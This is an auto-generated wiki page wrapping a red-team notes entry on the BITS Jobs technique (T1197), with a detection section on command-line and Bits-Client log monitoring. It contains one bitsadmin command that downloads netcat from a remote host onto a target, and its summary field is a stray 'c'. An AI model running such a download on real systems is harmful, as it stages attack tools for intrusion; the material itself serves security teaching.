---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# BITS Jobs

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1197-bits-jobs` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1197-bits-jobs.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

c

## Preserved Body

````markdown
## Execution
```c
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```
![](<../../_assets/bits-download.png>)

## Observations

Commandline arguments monitoring can help discover bitsadmin usage:

![](<../../_assets/bits-cmdline.png>)

`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:

![](<../../_assets/bits-operational-logs.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/bits-jobs.md)

## Evidence Excerpt

```text
_asset_filenames:
- bits-cmdline.png
- bits-download.png
- bits-operational-logs.png
_body: '---
description: File upload to the compromised system.
---
# BITS Jobs
```
